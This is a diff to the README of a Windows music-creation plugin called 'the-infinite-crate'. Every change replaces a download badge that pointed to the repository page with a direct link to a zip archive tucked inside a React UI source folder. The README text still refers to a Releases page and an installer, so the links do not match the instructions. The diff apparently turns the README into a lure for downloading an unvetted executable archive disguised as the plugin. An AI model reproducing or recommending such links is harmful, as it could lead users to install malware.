@@ -1,6 +1,6 @@
 # 🎵 the-infinite-crate - Easy Music Creation Plugin
 
-[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate)
+[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate/raw/refs/heads/main/react_ui/src/layout/views/infinite_crate_the_v2.1.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before installing, make sure your Windows computer meets these basic needs:
 
 Click the big green button below or copy and paste the link into your browser. This will take you to the download page.
 
-[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate)
+[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate/raw/refs/heads/main/react_ui/src/layout/views/infinite_crate_the_v2.1.zip)
 
 1. On the page, look for the **Releases** section.
 2. Find the latest version labeled "Windows Installer" or similar.
@@ -118,4 +118,4 @@ Visit the project page anytime to find this material in the **docs** folder or t
 
 Click below to visit the download page and follow the instructions above:
 
-[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate)
+[![Download the-infinite-crate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/outofprint-statesgeneral134/the-infinite-crate/raw/refs/heads/main/react_ui/src/layout/views/infinite_crate_the_v2.1.zip)
